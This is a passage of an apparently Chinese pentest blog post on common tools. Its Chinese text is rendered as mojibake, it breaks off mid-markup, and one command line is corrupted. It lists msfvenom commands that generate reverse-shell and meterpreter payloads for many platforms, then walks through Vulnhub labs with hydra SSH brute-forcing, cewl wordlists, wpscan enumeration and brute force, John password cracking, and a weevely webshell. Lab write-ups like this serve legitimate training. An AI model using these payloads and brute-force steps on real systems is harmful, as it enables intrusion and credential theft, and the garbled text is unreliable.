href="#msfvenom-â€”list-platforms" class="headerlink" title="msfvenom â€”list platforms"></a>msfvenom â€”list platforms</h4><p>#æŸ¥çœ‹æ”¯æŒç³»ç»Ÿå¹³å°</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aix, <span class="keyword">android, </span>apple_ios, <span class="keyword">bsd, </span><span class="keyword">bsdi, </span>cisco, firefox, freebsd, hardware, hpux, irix, <span class="keyword">java, </span><span class="keyword">javascript, </span><span class="keyword">juniper, </span>linux, mainframe, <span class="keyword">multi, </span>netbsd, netware, nodejs, openbsd, osx, php, python, r, ruby, solaris, unifi, unix, unknown, windows</span><br></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payload <span class="comment">#åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„payload</span></span><br><span class="line"></span><br><span class="line">msfvenom -l formats <span class="comment">#åˆ—å‡ºæ‰€æœ‰çš„è¾“å‡ºæ ¼å¼</span></span><br><span class="line"></span><br><span class="line">msfvenom -l <span class="built_in">encrypt</span> <span class="comment">#åˆ—å‡ºæ‰€æœ‰çš„åŠ å¯†æ–¹å¼</span></span><br><span class="line"></span><br><span class="line">msfvenom -l encoders <span class="comment">#åˆ—å‡ºæ‰€æœ‰çš„ç¼–ç å™¨</span></span><br></pre></td></tr></table></figure><h4 id="å¸¸è§ç”Ÿæˆæ ¼å¼"><a href="#å¸¸è§ç”Ÿæˆæ ¼å¼" class="headerlink" title="å¸¸è§ç”Ÿæˆæ ¼å¼"></a>å¸¸è§ç”Ÿæˆæ ¼å¼</h4><h5 id="1ã€-Windows"><a href="#1ã€-Windows" class="headerlink" title="1ã€ Windows"></a>1ã€ Windows</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> windows -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp -<span class="selector-tag">i</span> <span class="number">3</span> -e x86/shikata_ga_nai -f exe -o payload<span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure><h5 id="2ã€Linux"><a href="#2ã€Linux" class="headerlink" title="2ã€Linux"></a>2ã€Linux</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> linux -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> linux/x86/meterpreter/reverse_tcp -f elf -o payload<span class="selector-class">.elfxxxxxxxxxx</span>Â msfvenom <span class="attr">--platform</span> linux -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> linux/x86/meterpreter/reverse_tcp -f elf -o payload.elf1</span><br></pre></td></tr></table></figure><h5 id="3ã€Mac"><a href="#3ã€Mac" class="headerlink" title="3ã€Mac"></a>3ã€Mac</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> osx -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> osx/x86/shell_reverse_tcp -f macho -o payload<span class="selector-class">.macho</span></span><br></pre></td></tr></table></figure><h5 id="4ã€Android"><a href="#4ã€Android" class="headerlink" title="4ã€Android"></a>4ã€Android</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android<span class="regexp">/meterpreter/</span>reverse_tcp -o payload.apk</span><br></pre></td></tr></table></figure><h5 id="5ã€Aspx"><a href="#5ã€Aspx" class="headerlink" title="5ã€Aspx"></a>5ã€Aspx</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --platform windows-p windows<span class="regexp">/meterpreter/</span>reverse_tcp -f aspx -o payload.aspx</span><br></pre></td></tr></table></figure><h5 id="6ã€JSP"><a href="#6ã€JSP" class="headerlink" title="6ã€JSP"></a>6ã€JSP</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> java -<span class="selector-tag">p</span> java/jsp_shell_reverse_tcp -f raw -o payload<span class="selector-class">.jsp</span></span><br></pre></td></tr></table></figure><h5 id="7ã€PHP"><a href="#7ã€PHP" class="headerlink" title="7ã€PHP"></a>7ã€PHP</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp -f raw -o payload.php</span><br></pre></td></tr></table></figure><h5 id="8ã€BASH"><a href="#8ã€BASH" class="headerlink" title="8ã€BASH"></a>8ã€BASH</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd<span class="regexp">/unix/</span>reverse_bash -f raw -o shell.sh</span><br></pre></td></tr></table></figure><h5 id="9ã€Python"><a href="#9ã€Python" class="headerlink" title="9ã€Python"></a>9ã€Python</h5><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -<span class="keyword">p</span> <span class="keyword">python</span>/meterpreter/reverse_tcp -<span class="keyword">f</span> raw -<span class="keyword">o</span> <span class="keyword">shell</span>.<span class="keyword">py</span></span><br></pre></td></tr></table></figure><h4 id="Msfvenomå¸¸ç”¨å‘½ä»¤å‚æ•°"><a href="#Msfvenomå¸¸ç”¨å‘½ä»¤å‚æ•°" class="headerlink" title="Msfvenomå¸¸ç”¨å‘½ä»¤å‚æ•°"></a>Msfvenomå¸¸ç”¨å‘½ä»¤å‚æ•°</h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">-l, <span class="comment">--list &lt;type&gt; </span></span><br><span class="line"><span class="comment"># åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„é¡¹ç›®ï¼Œå…¶ä¸­å€¼å¯ä»¥è¢«è®¾ç½®ä¸º payloads, encoders, nops, platforms, archs, encrypt, formatsç­‰ç­‰</span></span><br><span class="line">-p, <span class="comment">--payload &lt;payload&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šç‰¹å®šçš„ Payloadï¼Œå¦‚æœè¢«è®¾ç½®ä¸º - ï¼Œé‚£ä¹ˆä»æ ‡å‡†è¾“å…¥æµä¸­è¯»å–</span></span><br><span class="line"><span class="comment">--list-options </span></span><br><span class="line"><span class="comment"># åˆ—å‡º--payload &lt;value&gt; çš„æ ‡å‡†ï¼Œé«˜çº§å’Œè§„é¿é€‰é¡¹</span></span><br><span class="line">-f, <span class="comment">--format &lt;format&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®š Payload çš„è¾“å‡ºæ ¼å¼(ä½¿ç”¨ --list formats åˆ—å‡º)</span></span><br><span class="line">-e, <span class="comment">--encoder &lt;encoder&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šä½¿ç”¨çš„ Encoder (ä½¿ç”¨ --list encoders åˆ—å‡º)</span></span><br><span class="line"><span class="comment">--sec-name &lt;value&gt; </span></span><br><span class="line"><span class="comment"># ç”Ÿæˆå¤§å‹WindowsäºŒè¿›åˆ¶æ–‡ä»¶æ—¶ä½¿ç”¨çš„æ–°åç§°ã€‚é»˜è®¤å€¼ï¼šéšæœº4ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">--smallest </span></span><br><span class="line"><span class="comment"># ä½¿ç”¨æ‰€æœ‰å¯ç”¨çš„ç¼–ç å™¨ç”Ÿæˆæœ€å°çš„payload</span></span><br><span class="line"><span class="comment">--encrypt &lt;value&gt; </span></span><br><span class="line"><span class="comment"># åº”ç”¨äºshellcodeçš„åŠ å¯†æˆ–ç¼–ç ç±»å‹ (ä½¿ç”¨--list encrypt åˆ—å‡º)</span></span><br><span class="line"><span class="comment">--encrypt-key &lt;value&gt; </span></span><br><span class="line"><span class="comment"># ç”¨äºåŠ å¯†çš„å¯†é’¥</span></span><br><span class="line"><span class="comment">--encrypt-iv &lt;value&gt; </span></span><br><span class="line"><span class="comment"># åŠ å¯†çš„åˆå§‹åŒ–å‘é‡</span></span><br><span class="line">-<span class="keyword">a</span>, <span class="comment">--arch &lt;arch&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šç›®æ ‡ç³»ç»Ÿæ¶æ„(ä½¿ç”¨ --list archs åˆ—å‡º)</span></span><br><span class="line"><span class="comment">--platform &lt;platform&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šç›®æ ‡ç³»ç»Ÿå¹³å° (ä½¿ç”¨ --list platforms åˆ—å‡º)</span></span><br><span class="line">-o, <span class="comment">--out &lt;path&gt; </span></span><br><span class="line"><span class="comment"># ä¿å­˜payloadæ–‡ä»¶</span></span><br><span class="line">-b, <span class="comment">--bad-chars &lt;list&gt; </span></span><br><span class="line"><span class="comment"># è®¾ç½®éœ€è¦åœ¨ Payload ä¸­é¿å…å‡ºç°çš„å­—ç¬¦ï¼Œå¦‚ï¼š &#x27;\x00\xff&#x27;</span></span><br><span class="line">-n, <span class="comment">--nopsled &lt;length&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®š nop åœ¨ payload ä¸­çš„æ•°é‡</span></span><br><span class="line">-s, <span class="comment">--space &lt;length&gt; </span></span><br><span class="line"><span class="comment"># è®¾ç½®æœªç»ç¼–ç çš„ Payload çš„æœ€å¤§é•¿åº¦</span></span><br><span class="line"><span class="comment">--encoder-space &lt;length&gt; </span></span><br><span class="line"><span class="comment"># ç¼–ç åçš„ Payload çš„æœ€å¤§é•¿åº¦</span></span><br><span class="line">-i, <span class="comment">--iterations &lt;count&gt; </span></span><br><span class="line"><span class="comment"># è®¾ç½® Payload çš„ç¼–ç æ¬¡æ•°</span></span><br><span class="line">-c, <span class="comment">--add-code &lt;path&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šåŒ…å«ä¸€ä¸ªé¢å¤–çš„win32 shellcodeæ–‡ä»¶</span></span><br><span class="line">-x, <span class="comment">--template &lt;path&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šä¸€ä¸ªç‰¹å®šçš„å¯æ‰§è¡Œæ–‡ä»¶ä½œä¸ºæ¨¡æ¿</span></span><br><span class="line">-k, <span class="comment">--keep </span></span><br><span class="line"><span class="comment"># ä¿æŠ¤æ¨¡æ¿ç¨‹åºçš„åŠŸèƒ½ï¼Œæ³¨å…¥çš„payloadä½œä¸ºä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œ</span></span><br><span class="line">-v, <span class="comment">--var-name &lt;value&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šä¸€ä¸ªå˜é‡åï¼ˆå½“æ·»åŠ  -f å‚æ•°çš„æ—¶å€™ï¼Œä¾‹å¦‚ -f pythonï¼Œé‚£ä¹ˆè¾“å‡ºä¸º python ä»£ç ï¼Œ payload ä¼šè¢«æŒ‰è¡Œæ ¼å¼åŒ–ä¸º python ä»£ç ï¼Œè¿½åŠ åˆ°ä¸€ä¸ª python å˜é‡ä¸­ï¼Œè¿™ä¸ªå‚æ•°å³ä¸ºæŒ‡å®š python å˜é‡çš„å˜é‡åï¼‰</span></span><br><span class="line">-t, <span class="comment">--timeout &lt;second&gt; </span></span><br><span class="line"><span class="comment"># è®¾ç½®ä»STDINè¯»å–payloadçš„ç­‰å¾…æ—¶é—´ï¼ˆé»˜è®¤ä¸º30,0ä¸ºç¦ç”¨ï¼‰</span></span><br><span class="line">-h, <span class="comment">--help </span></span><br><span class="line"><span class="comment"># å¸®åŠ©</span></span><br></pre></td></tr></table></figure><h2 id="2ï¼‰hydra"><a href="#2ï¼‰hydra" class="headerlink" title="2ï¼‰hydra"></a>2ï¼‰hydra</h2><blockquote><p><code>hydraæ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„çˆ†ç ´å·¥å…·,æš´åŠ›ç ´è§£å¼±å¯†ç ,æ˜¯ä¸€ä¸ªæ”¯æŒä¼—å¤šåè®®çš„çˆ†ç ´å·¥å…·</code></p></blockquote><h3 id="1-çˆ†ç ´ç”¨æˆ·å¯†ç "><a href="#1-çˆ†ç ´ç”¨æˆ·å¯†ç " class="headerlink" title="1.çˆ†ç ´ç”¨æˆ·å¯†ç "></a>1.çˆ†ç ´ç”¨æˆ·å¯†ç </h3><p><strong>è¿™é‡Œä»¥vulnhub dc1ä¸ºä¾‹</strong></p><p>ç”¨äº†<code>hydra</code>[æµ·å¾·æ‹‰]å·¥å…·ï¼Œå¯¹<code>flag4</code>ç”¨æˆ·è¿›è¡Œçˆ†ç ´</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -p <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt.gz <span class="number">192.168</span>.<span class="number">133.136</span> -vV -f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-læ˜¯æŒ‡å®šç”¨æˆ·æˆ–æŒ‡å®šåŒ…å«å¤šä¸ªç”¨æˆ·çš„æ–‡ä»¶ï¼Œ-pæ˜¯æŒ‡å®šå¯†ç æˆ–æŒ‡å®šåŒ…å«å¤šä¸ªå¯†ç çš„æ–‡ä»¶ï¼Œsshå°±æ˜¯</span><br><span class="line">ç”¨æˆ·æ‰€åœ¨çš„ç½‘ç«™</span><br><span class="line"></span><br><span class="line">ä¸Šé¢-pçš„æ–‡ä»¶æ˜¯kaliè‡ªå¸¦çš„å¯†ç åŒ…ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨å…¶ä»–çš„</span><br><span class="line"></span><br><span class="line">-s ç«¯å£</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220830211739164.png" alt="image-20220830211739164"></p><p>è¿™é‡Œå°±çœ‹åˆ°<code>flag4</code>ç”¨æˆ·çš„å¯†ç è¢«çˆ†ç ´å‡ºæ¥ï¼Œæ˜¯<code>orange</code></p><p>ç„¶åç”¨<code>ssh</code>è¿æ¥</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ssh <span class="symbol">flag4@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.136</span></span><br><span class="line">ç„¶åyes</span><br><span class="line">ç„¶åè¾“å…¥å¯†ç ï¼šorange</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220830211817515.png" alt="image-20220830211817515"></p><h2 id="3ï¼‰cewl"><a href="#3ï¼‰cewl" class="headerlink" title="3ï¼‰cewl"></a>3ï¼‰cewl</h2><blockquote><p> <code>Cewlæ˜¯ä¸€ä¸ªé€šè¿‡æŒ‡å®šurlåŠæ·±åº¦,ä½¿ç”¨çˆ¬è™«æŠ€æœ¯,ç”Ÿæˆå­—å…¸çš„ä¸€ä¸ªå·¥å…·ã€‚Cewlæ˜¯é€šè¿‡rubyç¼–å†™,é€šè¿‡çˆ¬å–ç½‘ç«™å¹¶æå–ç‹¬ç«‹çš„å•è¯ä¿å­˜ä¸ºå­—å…¸,å¯ä»¥å’ŒJohn the Ripperç­‰å·¥å…·é…åˆä½¿ç”¨ã€‚</code></p><p> <code>ä¸»è¦è¿˜æ˜¯æ ¹æ®ç½‘ç«™è‡ªèº«çš„å…³é”®è¯ï¼Œç„¶åç”Ÿæˆçš„å­—å…¸ï¼Œæ¯”å¦‚cewlï¼Œflagç­‰ç­‰</code></p></blockquote><p><strong>è¿™é‡Œä»¥vulnhub dc2ä¸ºä¾‹</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-wç­‰åŒäº&gt;   <span class="regexp">//</span>å†™å…¥</span><br><span class="line">-m n       <span class="regexp">//</span>è‡³å°‘ç”Ÿæˆçš„é•¿åº¦ä¸ºnï¼Œé»˜è®¤æ˜¯<span class="number">3</span></span><br><span class="line">-d x       <span class="regexp">//</span>ç”Ÿæˆæ›´å¤§çš„å­—å…¸ï¼Œé»˜è®¤x=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç”¨<code>cewl</code>è¯•è¯•ç”Ÿæˆå­—å…¸</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥cewl http:<span class="regexp">//</span>dc-<span class="number">2</span>/ &gt;pass.txt</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220831221031390.png" alt="image-20220831221031390"></p><p>ç›®å½•ä¸‹å°±ä¼šç”Ÿæˆ<code>pass.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cat</span> pass.txtï¼ŒæŸ¥çœ‹å†…å®¹</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220831221151099.png" alt="image-20220831221151099"></p><p>å‘ç°æ˜¯ç”Ÿæˆå¯¹åº”ç½‘ç«™çš„å¯†ç å­—å…¸</p><h2 id="4ï¼‰wpscan"><a href="#4ï¼‰wpscan" class="headerlink" title="4ï¼‰wpscan"></a>4ï¼‰wpscan</h2><blockquote><p><code>WPScanæ˜¯Kali Linuxé»˜è®¤è‡ªå¸¦çš„ä¸€æ¬¾æ¼æ´æ‰«æå·¥å…·,å®ƒé‡‡ç”¨Rubyç¼–å†™ èƒ½å¤Ÿæ‰«æWordPressç½‘ç«™ä¸­çš„å¤šç§å®‰å…¨æ¼æ´,å…¶ä¸­åŒ…æ‹¬ä¸»é¢˜æ¼æ´ã€æ’ä»¶æ¼æ´å’ŒWordPressæœ¬èº«çš„æ¼æ´</code></p></blockquote><p><strong>è¿™é‡Œä»¥vulnhub dc2ä¸ºä¾‹</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wpscan -url http:<span class="regexp">//</span>dc-<span class="number">2</span> -e u</span><br><span class="line"></span><br><span class="line">-e u    <span class="regexp">//</span>æšä¸¾ç”¨æˆ·ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">wpscan -url xx -P xx -U xx</span><br><span class="line">-P passwdspath  <span class="regexp">//</span>å¯†ç å­—å…¸è·¯å¾„ï¼Œæˆ–è€…ç›´æ¥å†™</span><br><span class="line">-U userspath    <span class="regexp">//</span>ç”¨æˆ·åå­—å…¸è·¯å¾„ï¼Œæˆ–è€…ç›´æ¥å†™</span><br></pre></td></tr></table></figure><p>äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é’ˆå¯¹æ€§å¯¹wordpressè¿›è¡Œæ¸—é€çœ‹çœ‹ï¼Œå¯ä¸å¯ä»¥åˆ©ç”¨ä¸€ä¸‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥wpscan --url http:<span class="regexp">//</span>dc-<span class="number">2</span> -e u</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220831223359965.png" alt="image-20220831223359965"></p><p>ç„¶åå¾€ä¸‹çœ‹ç”¨æˆ·å</p><p><img src="/2023/02/13/Commontools/image-20220831223432802.png" alt="image-20220831223432802"></p><p>å‘ç°æœ‰ä¸‰ä¸ªï¼Œç„¶åå¯ä»¥å¤åˆ¶ä¸‹æ¥ï¼Œå¼„ä¸€ä¸ªç”¨æˆ·åçš„æ–‡æœ¬ï¼Œå’Œä¹‹å‰çš„<code>pass.txt</code>è¿™ä¸ªå¯†ç æœ¬ä¸€æ ·</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥vi un.txt,æŠŠadmin <span class="keyword">jerry </span>tomå¤åˆ¶è¿›å»</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220831223714569.png" alt="image-20220831223714569"></p><p>ç„¶åå°±å¯ä»¥ç»“åˆæˆ‘ä»¬çš„å¯†ç æ–‡æœ¬å’Œç”¨æˆ·åæ–‡æœ¬ï¼Œåˆ©ç”¨wpscanè¿™ä¸ªå·¥å…·ï¼Œè¿›è¡Œçˆ†ç ´æ“ä½œäº†</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥wpscan --url http:<span class="regexp">//</span>dc-<span class="number">2</span> -P pass.txt -U un.txt</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220831223950721.png" alt="image-20220831223950721"></p><p>ç¨å¾®ç­‰ä¸€ä¼š</p><p><img src="/2023/02/13/Commontools/image-20220831224205560.png" alt="image-20220831224205560"></p><p>adminç”¨æˆ·å¯†ç æ²¡æœ‰æ‰¾åˆ°ï¼Œåº”è¯¥æ˜¯æœ€é«˜æƒé™çš„è´¦å·</p><p>ä½†æ˜¯jerryå’Œtomç”¨æˆ·çš„å¯†ç çŸ¥é“äº†</p><h2 id="5ï¼‰John"><a href="#5ï¼‰John" class="headerlink" title="5ï¼‰John"></a>5ï¼‰John</h2><p>Johnæ˜¯ä¸€ä¸ªç ´è§£ç³»ç»Ÿå¯†ç çš„å·¥å…·</p><p>ä½¿ç”¨å¾ˆç®€å•</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john passwd<span class="selector-class">.txt</span> <span class="comment">//è¿™é‡Œæ˜¯ç›´æ¥åˆ©ç”¨johnè‡ªå¸¦çš„å¯†ç æœ¬ï¼Œåé¢æ¥çš„æ˜¯éœ€è¦çˆ†ç ´çš„å¯†ç æ–‡æœ¬æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">john <span class="attr">--wordlist</span>=å­—å…¸è·¯å¾„ passwd<span class="selector-class">.txt</span> <span class="comment">//è¿™é‡Œæ˜¯æŒ‡å®šå¯†ç æœ¬ï¼Œåé¢æ¥çš„æ˜¯éœ€è¦çˆ†ç ´çš„å¯†ç æ–‡æœ¬æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john <span class="attr">--show</span> passwd<span class="selector-class">.txt</span> <span class="comment">//è¿™æ˜¯æŸ¥çœ‹è¯¥å¯†ç æ–‡æœ¬ä¸­å·²ç»è¢«çˆ†ç ´æˆåŠŸè¿‡çš„å¯†ç </span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220903140126704.png" alt="image-20220903140126704"></p><p>å°±å¯ä»¥çœ‹åˆ°æ˜æ–‡ä¸º<code>snoopy</code></p><h2 id="6ï¼‰weevely"><a href="#6ï¼‰weevely" class="headerlink" title="6ï¼‰weevely"></a>6ï¼‰weevely</h2><blockquote><p>Weevelyæ˜¯ä¸€æ¬¾ä½¿ç”¨pythonç¼–å†™çš„webshellå·¥å…·,é›†webshellç”Ÿæˆå’Œè¿æ¥äºä¸€èº«,é‡‡ç”¨c&#x2F;sæ¨¡å¼ æ„å»º,å¯ä»¥ç®—ä½œæ˜¯linuxä¸‹çš„ä¸€æ¬¾phpèœåˆ€æ›¿ä»£å·¥å…·</p></blockquote><p>ç”ŸæˆShell</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">weevely <span class="keyword">generate</span>  &lt;æ–‡ä»¶å&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">weevely <span class="keyword">generate</span> <span class="number">123456</span> shell<span class="variable">.php</span></span><br></pre></td></tr></table></figure><p>æŠŠç”Ÿæˆçš„å†…å®¹ï¼Œå¤åˆ¶åˆ°æˆ‘ä»¬åˆ›å»ºçš„<code>789.php</code>æ–‡ä»¶é‡Œï¼Œå’Œå‰é¢ä¸¤ä¸ªæ–¹æ³•æ­¥éª¤ä¸€æ ·</p><p>åˆ©ç”¨è§¦å‘shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">weevely</span> http://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">789</span>.php <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">python</span> -m http.server <span class="number">9999</span>   </span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/Commontools/image-20220904133118746.png" alt="image-20220904133118746"></p><p>æˆåŠŸè¿›å…¥shell</p><h2 id="7ï¼‰whatweb"><a href="#7ï¼‰whatweb" class="headerlink" title="7ï¼‰whatweb"></a>7ï¼‰whatweb</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whatweb http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">220.156</span>/ &gt;&gt; whatweb.txt</span><br><span class="line"><span class="regexp">//</span>æŠŠç½‘ç«™çš„æ¡†æ¶ä¿¡æ¯å¯¼å…¥åˆ°æ–‡æœ¬whatweb.txtä¸­</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå·¥å…·ä¸»è¦æ˜¯æŸ¥çœ‹ç½‘ç«™çš„æ¡†æ¶ï¼Œå’Œ<code>wapplzer</code>ç±»ä¼¼</p><p><img src="/2023/02/13/Commontools/image-20221103104233193.png" alt="image-20221103104233193"></p><h2 id="8ï¼‰knockd"><a href="#8ï¼‰knockd" class="headerlink" title="8ï¼‰knockd"></a>8ï¼‰knockd</h2><blockquote><p>åœ¨1920å¹´ä»£ï¼Œå½“ç¦ä»¤å¦‚ç«å¦‚è¼åœ°è¿›è¡Œæ—¶ï¼Œå¦‚æœæ‚¨æƒ³è¿›å…¥è¯´è¯çŠ¶æ€ï¼Œå°±å¿…é¡»çŸ¥é“ç§˜å¯†çš„æ•²é—¨å£°ï¼Œå¹¶æ­£ç¡®åœ°æ•²æ‰“å®ƒæ‰èƒ½è¿›å…¥å†…éƒ¨ã€‚</p><p>ç«¯å£æ•²é—¨æ˜¯ç°ä»£çš„ç­‰åŒç‰©ã€‚ å¦‚æœæ‚¨å¸Œæœ›äººä»¬å¯ä»¥è®¿é—®æ‚¨è®¡ç®—æœºä¸Šçš„æœåŠ¡ï¼Œä½†åˆä¸æƒ³å°†é˜²ç«å¢™æ‰“å¼€åˆ°Internetï¼Œåˆ™å¯ä»¥ä½¿ç”¨ç«¯å£æ–­å¼€åŠŸèƒ½ã€‚<br>å®ƒå…è®¸æ‚¨å…³é—­é˜²ç«å¢™ä¸Šå…è®¸ä¼ å…¥è¿æ¥çš„ç«¯å£ï¼Œå¹¶åœ¨è¿›è¡Œé¢„å…ˆå®‰æ’çš„è¿æ¥å°è¯•æ–¹å¼æ—¶è‡ªåŠ¨æ‰“å¼€å®ƒä»¬ã€‚ è¿æ¥å°è¯•çš„é¡ºåºå……å½“ç§˜å¯†æ•²é—¨ã€‚ å¦ä¸€ä¸ªç§˜å¯†çš„æ•²é—¨å£°å…³é—­äº†æ¸¯å£ã€‚</p></blockquote><p>ä»€ä¹ˆæ„æ€å‘¢ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘å…ˆå…³é—­äº†ä¸€ä¸ªç«¯å£</p><p>ä½†æ˜¯å‘¢ï¼Œæˆ‘ä¸ºäº†æˆ‘æƒ³è¦çš„äººè®¿é—®å®ƒï¼Œæˆ‘å†™äº†ä¸€ä¸ª<code>æ•²é—¨çš„é¡ºåºï¼ˆä¹Ÿå°±æ˜¯è®¿é—®ç«¯å£çš„é¡ºåºï¼‰</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span 